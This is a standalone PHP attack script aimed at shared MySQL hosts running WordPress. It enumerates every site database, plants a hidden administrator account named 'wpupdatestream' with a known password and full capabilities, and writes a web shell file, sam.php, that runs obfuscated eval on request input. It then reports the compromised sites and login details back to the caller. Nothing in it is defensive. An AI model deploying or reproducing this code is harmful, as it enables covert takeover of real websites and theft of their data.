<?php
error_reporting(0);
if(isset($_GET['check']))
{
echo "pawet";
}
if(isset($_REQUEST["v1"]))
{
   $link = mysql_connect($_REQUEST["v1"], $_REQUEST["v2"], $_REQUEST["v3"]);
   $query = "SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema NOT IN ( 'information_schema', 'performance_schema', 'mysql' )";
   $result = mysql_query($query);
   $tables_list = array();
   while ($line = mysql_fetch_array($result))
   {
      if (strpos($line["table_name"],'_options') !== false) {
//Dostaem site
$b = $line["table_schema"].".".$line["table_name"];
$query2 = "select concat(option_value,'|%5%5%5') from ".$b." where option_name='siteurl'";
$result2 = mysql_query($query2);
$row = mysql_fetch_row($result2);
if (strpos($row[0],'|%5%5%5') !== false) {
$p = explode("|", $row[0]);
$site_name = $p[0];
//Dostaem pyt
$query3 = "select concat(option_value,'|%5%5%5') from ".$b." where option_name='recently_edited'";
$result3 = mysql_query($query3);
$row2 = mysql_fetch_row($result3);
if (strpos($row2[0],'|%5%5%5') !== false) {
$p2 = explode("|", $row2[0]);
$patuka = $p2[0];
$z1 = explode('"', $patuka);
if (strpos($z1[1],'.php') !== false) {
     $patuka = $z1[1];
}
}
$p = explode("_", $line["table_name"]);
$table_p = $p[0]."_";
$db = $line["table_schema"];
array_push($tables_list,$b."<|>".$site_name."<|>".$table_p."<|>".$db."<|>".$patuka);
}
      }  

}
foreach($tables_list as $aaa)
{
$list = explode("<|>", $aaa);
$patuka = $list[4];
$pat = explode("/",$patuka);
$patuka = str_replace($pat[count($pat)-1],"",$patuka);
$table_pref = $list[2];
$site_name = $list[1];
$db = $list[3];
mysql_select_db($db);
$query = "INSERT INTO `".$table_pref."users` (`ID`, `user_login`, `user_pass`, `user_nicename`, `user_email`, `user_status`, `display_name`) VALUES ('9192191', 'wpupdatestream', '".base64_decode("JFAkQk5yZmE4eE1Memp0TVhFQjNaeC9IcnhjQXlmV21tLw==")."', 'tempuser', 'support@wpwhitesecurity.com', '0', 'Temp User')";
mysql_query($query);
$query = "INSERT INTO `".$table_pref."usermeta` (`umeta_id`,`user_id`,`meta_key`,`meta_value`) VALUES ('9192192', '9192191', '".$table_pref."capabilities', 'a:18:{s:13:\"administrator\";s:1:\"1\";s:34:\"wpml_manage_translation_management\";b:1;s:21:\"wpml_manage_languages\";b:1;s:41:\"wpml_manage_theme_and_plugin_localization\";b:1;s:19:\"wpml_manage_support\";b:1;s:29:\"wpml_manage_media_translation\";b:1;s:22:\"wpml_manage_navigation\";b:1;s:24:\"wpml_manage_sticky_links\";b:1;s:30:\"wpml_manage_string_translation\";b:1;s:33:\"wpml_manage_translation_analytics\";b:1;s:25:\"wpml_manage_wp_menus_sync\";b:1;s:32:\"wpml_manage_taxonomy_translation\";b:1;s:27:\"wpml_manage_troubleshooting\";b:1;s:31:\"wpml_manage_translation_options\";b:1;s:36:\"wpml_manage_woocommerce_multilingual\";b:1;s:37:\"wpml_operate_woocommerce_multilingual\";b:1;s:9:\"translate\";b:1;s:14:\"backwpup_admin\";b:1;}')";
mysql_query($query);
$query = "INSERT INTO `".$table_pref."usermeta` (`umeta_id`, `user_id`, `meta_key`, `meta_value`) VALUES ('9192191', '9192191', '".$table_pref."user_level', '10')";
mysql_query($query);
$query = "SELECT '<?php $a=chr(98).chr(97).chr(115).chr(101).chr(54).chr(52).chr(95).chr(100).chr(101).chr(99).chr(111).chr(100).chr(101); eval($a($_REQUEST[sam]));die();'  INTO OUTFILE '".$patuka."sam.php' FIELDS TERMINATED BY '' OPTIONALLY ENCLOSED BY '' LINES TERMINATED BY '\n'";
mysql_query($query);

$query3 = "select user_login from `".$table_pref."users` where ID=9192191";
$result3 = mysql_query($query3);
$line3 = mysql_fetch_row($result3);
if($line3[0] == 'wpupdatestream')
{
echo $site_name."<|>wpupdatestream<|>p123123<|>".$patuka."|new|";
}
}
    mysql_close($link);
}
?>